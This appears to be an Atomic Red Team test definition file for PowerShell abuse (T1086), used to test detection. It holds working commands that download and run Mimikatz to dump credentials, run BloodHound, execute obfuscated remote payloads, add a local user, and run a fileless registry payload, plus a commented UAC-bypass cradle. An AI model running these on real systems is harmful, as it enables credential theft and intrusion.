---
attack_technique: T1086
display_name: PowerShell

atomic_tests:
- name: Mimikatz
  uuid: f4ad8b54-9e01-4242-b44a-8f377f392d63

  description: |
    Download Mimikatz and dump credentials

  supported_platforms:
    - windows

  input_arguments:
    mimurl:
      description: Mimikatz url
      type: url
      default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1

  executor:
    name: command_prompt
    command: |
      powershell.exe 'IEX (New-Object Net.WebClient).DownloadString("#{mimurl}"); Invoke-Mimikatz -DumpCreds'

- name: BloodHound
  uuid: d9eb7d08-0247-4882-9677-2c7f55b6aefb

  description: |
    Download Bloodhound and run it

  supported_platforms:
    - windows

  input_arguments:
    bloodurl:
      description: BloodHound URL
      type: url
      default: https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1

  executor:
    name: command_prompt
    command: |
      powershell.exe 'IEX (New-Object Net.WebClient).DownloadString("#{bloodurl}"); Invoke-BloodHound'

- name: Obfuscation Tests
  description: |
    Different obfuscated methods to test
    Reaches out to bit.ly/L3g1t to stdout: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
  supported_platforms:
    - windows

  executor:
    name: powershell
    command: |
      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
      Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))

#@todo
# - name: Mimikatz - Cradlecraft PsSendKeys
#   description: |
#     Run mimikatz via PsSendKeys
#   supported_platforms:
#     - windows
#
#   executor:
#     name: powershell
#     command: |
#       $url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr

#@todo win10 only
# - name: Invoke-AppPathBypass
#   description: |
#     Note: Windows 10 only
#     Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
#   supported_platforms:
#     - windows
#
#   executor:
#     name: command_prompt
#     command: |
#       Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"

- name: PowerShell Add User
  description: |
    Using PS 5.1, add a user via CLI
  supported_platforms:
    - windows

  input_arguments:
    user_name:
      description: username to add
      type: string
      default: atomic_user
    full_name:
      description: Full name of user
      type: string
      default: Atomic Red Team
    password:
      description: password to use
      type: string
      default: ATOM1CR3DT3@M
    description:
      description: Brief description of account
      type: string
      default: Atomic Things
  executor:
    name: powershell
    command: |
      $Secure_String_Pwd = ConvertTo-SecureString "P@ssW0rD!" -AsPlainText -Force
      New-LocalUser '#{user_name}' -Password $Secure_String_Pwd -FullName '#{full_name}' -Description '#{description}'

- name: Powershell MsXml COM object - no prompt
  description: |
    Provided by https://github.com/mgreen27/mgreen27.github.io
    Powershell MsXml COM object.
    Not proxy aware removing cache although does not appear to write to those locations
  supported_platforms:
    - windows

  input_arguments:
    url:
      description: url of payload to execute
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1

  executor:
    name: powershell
    command: |
      $objXMLHTTP = New-Object -ComObject MSXML2.ServerXMLHTTP
      $objXMLHTTP.Open("GET", "#{url}", $False)
      $objXMLHTTP.send()
      iex $objXMLHTTP.ResponseText

- name: Powershell XML requests
  description: |
    Provided by https://github.com/mgreen27/mgreen27.github.io
    Powershell xml download request
  supported_platforms:
    - windows

  input_arguments:
    url:
      description: url of payload to execute
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml

  executor:
    name: powershell
    command: |
      $Xml = (New-Object System.Xml.XmlDocument);
      $Xml.Load('#{url}');
      $Xml.command.a.execute | IEX

- name: Powershell invoke mshta.exe download
  description: |
    Provided by https://github.com/mgreen27/mgreen27.github.io
    Powershell invoke mshta to download payload
  supported_platforms:
    - windows

  input_arguments:
    url:
      description: url of payload to execute
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct

  executor:
    name: powershell
    command: |
      C:\Windows\system32\cmd.exe  /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
- name: PowerShell Fileless Script Execution
  description: |
   Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections.
  supported_platforms:
    - windows

  executor:
    name: command_prompt
    command: |
      reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggJ0M6L1dpbmRvd3MvVGVtcC9hcnQtbWFya2VyLnR4dCcgLXZhbHVlICJIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0i" /f
      powershell.exe -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
